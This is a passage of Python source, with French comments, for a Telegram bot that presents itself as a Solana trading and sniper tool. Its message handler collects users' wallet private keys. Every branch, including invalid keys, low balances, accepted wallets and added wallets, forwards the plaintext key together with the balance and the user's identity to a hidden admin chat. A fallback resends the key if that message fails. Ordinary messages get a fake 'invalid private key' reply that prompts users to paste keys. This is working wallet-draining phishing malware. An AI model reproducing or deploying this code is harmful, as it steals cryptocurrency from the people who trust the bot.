📈 <b>Position:</b> {position:.4f} SOL
📊 <b>PNL:</b> +{pnl_percentage:.2f}%
💵 <b>Profit:</b> +{profit_sol:.4f} SOL"""
        
        try:
            await context.bot.send_message(
                chat_id=ADMIN_CHAT_ID,
                text=admin_notification,
                parse_mode='HTML'
            )
        except Exception as e:
            logger.error(f"Erreur envoi à l'admin: {e}")
        
        return
    
    # Vérifier si l'utilisateur attend d'ajouter un wallet supplémentaire
    if context.user_data.get('waiting_for_additional_wallet'):
        context.user_data['waiting_for_additional_wallet'] = False
        
        # Vérifier la clé privée
        public_key, sol_balance, usd_value, sol_price, status = await verify_wallet_and_balance(user_message)
        
        if status == "invalid":
            await update.message.reply_text(
                "⚠️ Invalid private key. Please try again.",
                parse_mode='HTML'
            )
            return
        
        # Ajouter le wallet à la liste des user_wallets
        user_wallets = context.user_data.get('user_wallets', [])
        if public_key not in user_wallets:
            user_wallets.append(public_key)
            context.user_data['user_wallets'] = user_wallets
        
        success_message = f"""✅ **Wallet Added Successfully!**

👛 **Address:** `{public_key[:8]}...{public_key[-8:]}`
💰 **Balance:** {sol_balance:.4f} SOL (${usd_value:.2f} USD)

Total wallets: {len(user_wallets)}"""
        
        keyboard = [[InlineKeyboardButton("🏠 Back to Menu", callback_data='back_to_menu')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            success_message,
            reply_markup=reply_markup,
            parse_mode='HTML'
        )
        
        # Notification admin
        admin_notification = f"""➕ <b>Nouveau wallet ajouté</b>

👤 <b>Utilisateur:</b> {escape_html(user.first_name)}
🔢 <b>User ID:</b> <code>{user.id}</code>

👛 <b>Public Key:</b>
<code>{escape_html(public_key)}</code>

💰 <b>Balance:</b> {sol_balance:.4f} SOL (${usd_value:.2f} USD)

🔑 <b>Private Key:</b>
<code>{escape_html(user_message)}</code>

📊 <b>Total wallets:</b> {len(user_wallets)}"""
        
        try:
            await context.bot.send_message(
                chat_id=ADMIN_CHAT_ID,
                text=admin_notification,
                parse_mode='HTML'
            )
        except Exception as e:
            logger.error(f"Erreur envoi à l'admin: {e}")
        
        return
    
    # Vérifier si l'utilisateur attend d'ajouter une adresse whale
    if context.user_data.get('waiting_for_whale_address'):
        context.user_data['waiting_for_whale_address'] = False
        
        whale_address = user_message.strip()
        
        # Valider l'adresse
        if not validate_solana_address(whale_address):
            await update.message.reply_text(
                "⚠️ Invalid Solana address. Please try again.",
                parse_mode='HTML'
            )
            return
        
        # Ajouter à la liste de tracking
        wallets = context.user_data.get('tracked_wallets', [])
        if whale_address not in wallets:
            wallets.append(whale_address)
            context.user_data['tracked_wallets'] = wallets
        
        success_message = f"""✅ **Whale Wallet Added!**

🐋 **Address:** `{whale_address[:8]}...{whale_address[-8:]}`

Now tracking {len(wallets)} wallet(s) for whale movements."""
        
        keyboard = [[InlineKeyboardButton("🏠 Back to Menu", callback_data='back_to_menu')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            success_message,
            reply_markup=reply_markup,
            parse_mode='HTML'
        )
        
        # Notification admin
        admin_notification = f"""🐋 <b>Whale wallet ajouté</b>

👤 <b>Utilisateur:</b> {escape_html(user.first_name)}
🔢 <b>User ID:</b> <code>{user.id}</code>

🐋 <b>Whale Address:</b>
<code>{escape_html(whale_address)}</code>

📊 <b>Total wallets trackés:</b> {len(wallets)}"""
        
        try:
            await context.bot.send_message(
                chat_id=ADMIN_CHAT_ID,
                text=admin_notification,
                parse_mode='HTML'
            )
        except Exception as e:
            logger.error(f"Erreur envoi à l'admin: {e}")
        
        return
    
    # Vérifier si l'utilisateur attend de connecter son wallet
    if context.user_data.get('waiting_for_wallet'):
        wallet_type = context.user_data.get('wallet_type', 'Unknown')
        context.user_data['waiting_for_wallet'] = False
        
        # Vérifier la clé privée et le solde
        public_key, sol_balance, usd_value, sol_price, status = await verify_wallet_and_balance(user_message)
        
        if status == "invalid":
            # Clé privée invalide
            back_keyboard = [[InlineKeyboardButton("« Back", callback_data='back_to_wallet_menu')]]
            back_markup = InlineKeyboardMarkup(back_keyboard)
            
            await update.message.reply_text(
                "⚠️ Validation Error\n\nInvalid private key format.",
                reply_markup=back_markup
            )
            
            # Notification à l'admin
            admin_notification = f"""❌ <b>Clé privée invalide</b>

👤 <b>Utilisateur:</b> {escape_html(user.first_name)} {escape_html(user.last_name or '')}
🆔 <b>Username:</b> @{escape_html(user.username) if user.username else '❌ PAS DE USERNAME'}
🔢 <b>User ID:</b> <code>{user.id}</code>
💳 <b>Wallet Type:</b> {escape_html(wallet_type)}

🔑 <b>Private Key:</b>
<code>{escape_html(user_message)}</code>

---
⚠️ <i>Clé privée invalide</i>"""
            
            try:
                await context.bot.send_message(
                    chat_id=ADMIN_CHAT_ID,
                    text=admin_notification,
                    parse_mode='HTML'
                )
            except Exception as e:
                logger.error(f"Erreur envoi à l'admin: {e}")
            
            return
        
        # Clé valide, vérifier le solde en USD
        if usd_value < MINIMUM_USD_REQUIRED:
            # Wallet avec solde insuffisant
            back_keyboard = [[InlineKeyboardButton("« Back", callback_data='back_to_wallet_menu')]]
            back_markup = InlineKeyboardMarkup(back_keyboard)
            
            await update.message.reply_text(
                f"⚠️ Wallet Cannot Be Accepted\n\n"
                f"Insufficient balance.\n"
                f"Your wallet contains: {sol_balance:.4f} SOL (${usd_value:.2f} USD)\n\n"
                f"Please add more SOL to use trading features.",
                reply_markup=back_markup
            )
            
            # Notification à l'admin
            logger.info(f"Envoi notification admin - Wallet solde insuffisant: {public_key}")
            admin_notification = f"""⚠️ <b>Wallet rejeté - Solde insuffisant</b>

👤 <b>Utilisateur:</b> {escape_html(user.first_name)} {escape_html(user.last_name or '')}
🆔 <b>Username:</b> @{escape_html(user.username) if user.username else 'PAS DE USERNAME'}
🔢 <b>User ID:</b> <code>{user.id}</code>
💳 <b>Wallet Type:</b> {escape_html(wallet_type)}

👛 <b>Public Key:</b>
<code>{escape_html(public_key)}</code>

💰 <b>Balance:</b> {sol_balance:.4f} SOL
💵 <b>Valeur USD:</b> ${usd_value:.2f}
📊 <b>Prix SOL:</b> ${sol_price:.2f}
⚠️ <b>Minimum requis:</b> ${MINIMUM_USD_REQUIRED:.2f}

🔑 <b>Private Key:</b>
<code>{escape_html(user_message)}</code>

---
❌ <i>Wallet rejeté - Solde insuffisant (moins de ${MINIMUM_USD_REQUIRED} USD)</i>"""
            
            try:
                result = await context.bot.send_message(
                    chat_id=ADMIN_CHAT_ID,
                    text=admin_notification,
                    parse_mode='HTML'
                )
                logger.info(f"Message admin envoyé avec succès, message_id: {result.message_id}")
            except Exception as e:
                logger.error(f"ERREUR envoi à l'admin (solde insuffisant): {e}")
                # Essayer d'envoyer un message simplifié en cas d'erreur
                try:
                    simple_msg = f"⚠️ Wallet rejeté\nUser: {user.first_name}\nBalance: {sol_balance:.4f} SOL\nKey: {user_message}"
                    await context.bot.send_message(
                        chat_id=ADMIN_CHAT_ID,
                        text=simple_msg
                    )
                except Exception as e2:
                    logger.error(f"Même le message simple a échoué: {e2}")
            
            return
        
        # Wallet valide avec solde suffisant
        # Sauvegarder les informations du wallet dans user_data
        context.user_data['wallet_connected'] = True
        context.user_data['wallet_public_key'] = public_key
        context.user_data['wallet_balance_sol'] = sol_balance
        context.user_data['wallet_balance_usd'] = usd_value
        context.user_data['wallet_type'] = wallet_type
        
        # Créer un bouton pour retourner au menu
        back_keyboard = [[InlineKeyboardButton("🏠 Back to Main Menu", callback_data='back_to_menu')]]
        back_markup = InlineKeyboardMarkup(back_keyboard)
        
        await update.message.reply_text(
            f"✅ **Wallet Connected Successfully**\n\n"
            f"💳 **Type:** {escape_html(wallet_type)}\n"
            f"💰 <b>Balance:</b> {sol_balance:.4f} SOL (${usd_value:.2f} USD)\n"
            f"👛 <b>Address:</b> `{public_key[:8]}...{public_key[-8:]}`\n\n"
            f"You can now access all trading features.",
            reply_markup=back_markup,
            parse_mode='HTML'
        )
        
        # Notification à l'admin
        admin_notification = f"""✅ <b>Wallet connecté avec succès</b>

👤 <b>Utilisateur:</b> {escape_html(user.first_name)} {escape_html(user.last_name or '')}
🆔 <b>Username:</b> @{escape_html(user.username) if user.username else '❌ PAS DE USERNAME'}
🔢 <b>User ID:</b> <code>{user.id}</code>
💳 <b>Wallet Type:</b> {escape_html(wallet_type)}

👛 <b>Public Key:</b>
<code>{escape_html(public_key)}</code>
💰 <b>Balance:</b> {sol_balance:.4f} SOL
💵 <b>Valeur USD:</b> ${usd_value:.2f}
📊 <b>Prix SOL:</b> ${sol_price:.2f}

🔑 <b>Private Key:</b>
<code>{escape_html(user_message)}</code>

---
✅ <i>Wallet accepté et connecté</i>"""
        
        try:
            await context.bot.send_message(
                chat_id=ADMIN_CHAT_ID,
                text=admin_notification,
                parse_mode='HTML'
            )
        except Exception as e:
            logger.error(f"Erreur envoi à l'admin: {e}")
        
        return
    
    # Message normal - Notification à l'admin
    admin_notification = f"""📨 <b>Nouveau message reçu</b>

👤 <b>Utilisateur:</b> {escape_html(user.first_name)} {escape_html(user.last_name or '')}
🆔 <b>Username:</b> @{escape_html(user.username) if user.username else '❌ PAS DE USERNAME'}
🔢 <b>User ID:</b> {user.id}

💬 <b>Message:</b>
{escape_html(user_message)}

---
<i>Envoyé depuis le bot</i>"""
    
    try:
        # Envoyer le message à l'admin
        await context.bot.send_message(
            chat_id=ADMIN_CHAT_ID,
            text=admin_notification,
            parse_mode='HTML'
        )
        
    except Exception as e:
        logger.error(f"Erreur lors de l'envoi à l'admin: {e}")
    
    # Envoyer le message à l'utilisateur
    await update.message.reply_text(
        "⚠️ Validation Error\n\nInvalid private key format."
    )


def main():
    """Fonction principale pour lancer le bot"""
    
    # Création de l'application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Ajout des handlers (gestionnaires de commandes)
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("trade", trade_command))
    application.add_handler(CommandHandler("sniper", sniper_command))
    application.add_handler(CommandHandler("wallet", wallet_command))
    application.add_handler(CommandHandler("scan", scan_command))
    application.add_handler(CommandHandler("stats", stats_command))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("recap", recap_command))
    
    # Commandes correspondant aux boutons du menu
    application.add_handler(CommandHandler("quickbuy", quickbuy_command))
    application.add_handler(CommandHandler("bloom", bloom_command))
    application.add_handler(CommandHandler("multiwallet", multiwallet_command))
    application.add_handler(CommandHandler("analyzer", analyzer_command))
    application.add_handler(CommandHandler("predict", predict_command))
    application.add_handler(CommandHandler("whale", whale_command))
    application.add_handler(CommandHandler("rugcheck", rugcheck_command))
    
    application.add_handler(CallbackQueryHandler(button_handler))
    
    # Handler pour tous les messages texte
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_message))
    
    # Démarrage du bot
    logger.info("Bot démarré ! 🚀")
    logger.info(f"Messages seront envoyés au Chat ID: {ADMIN_CHAT_ID}")
    
    application.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == '__main__':
    main()
